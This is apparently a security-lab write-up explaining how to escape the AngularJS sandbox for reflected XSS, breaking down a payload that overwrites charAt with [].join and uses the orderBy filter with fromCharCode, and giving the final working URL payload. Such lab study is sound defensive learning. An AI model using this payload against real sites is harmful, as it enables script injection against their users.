## üîç Summary
This lab contains a **reflected XSS** vulnerability where `eval` function cannot be used to insert string into **Angular JS**.

## üõ† Payload
1. `toString().constructor`
   - `toString()` gives you a string.
   - `.constructor` gives you the **String constructor**.
     
2. ` .prototype.charAt=[].join`
   - Normally, Angular uses `charAt` during string access checks in sandboxing.
   - Overwriting `charAt` breaks the sandbox because Angular uses it internally for security parsing.
   - `[].join` is a safe method that doesn't throw errors, so it's often used to stub functions.
  
3. `[1] | orderBy: ...`
   - This uses AngularJS' filter system. `orderBy` can evaluate arbitary code in sandboxed Angular if we break it correctly.
   - `[1]` is just a dummy array to trigger the filter.
  
4. `toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)`
   - This builds the string: "x=alert(1)".
  
5. Final Payload:
   ```sh
   ?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
   ```

## üìñ Key Takeaways
- AngularJS can be exploited even when strings and `$eval` are blocked.
- Bypasses use prototype pollution (`charAt`) and string building (`fromCharCode`).
